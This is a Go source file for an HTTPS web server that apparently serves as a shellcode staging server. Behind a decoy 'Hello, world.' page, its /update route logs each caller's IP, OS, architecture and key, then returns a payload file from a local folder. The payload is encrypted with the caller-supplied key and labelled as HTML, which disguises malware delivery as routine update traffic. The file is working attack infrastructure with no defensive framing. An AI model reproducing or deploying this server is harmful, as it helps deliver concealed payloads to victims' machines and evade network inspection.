package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"time"

	"github.com/labstack/echo"
)

func main() {
	defer func() {
		if err := recover(); err != nil {
			fmt.Println("捕获异常:", err)
		}
	}()
	e := echo.New()

	e.GET("/update/:systype/:arch/:keys", getShellCode)
	e.GET("/", func(c echo.Context) error {
		return c.HTML(200, "Hello, world.")
	})
	listenStr := "0.0.0.0:443"
	ls, err := net.Listen("tcp", listenStr)
	if err != nil {
		panic(err)
	}

	serverpem := "./cert/server.pem"
	serverkey := "./cert/server.key"
	fmt.Println("server start. ", listenStr)
	fmt.Println("time\tip\tsystem-arch\tkeys")
	e.Logger.Fatal(e.TLSServer.ServeTLS(ls, serverpem, serverkey))
}

func getShellCode(c echo.Context) error {

	systype := c.Param("systype")
	sysarch := c.Param("arch")
	keys := c.Param("keys")

	fmt.Printf("%d\t%s\t%s-%s\t%s\n", time.Now().Unix(), c.RealIP(), systype, sysarch, keys)

	filepath := fmt.Sprintf("./payload/%s-%s", systype, sysarch)

	payload, err := os.Open(filepath)
	if err != nil {
		panic(err)
	}

	var returnCode []byte
	returnBuf := bytes.NewBuffer(returnCode)

	err = Encrypt(payload, returnBuf, []byte(keys), []byte(keys))
	if err != nil {
		fmt.Println(err)
		panic(err)
	}

	fff, err := ioutil.ReadAll(returnBuf)
	if err != nil {
		panic(err)
	}
	payload.Close()
	return c.Blob(200, "text/html", fff)
}
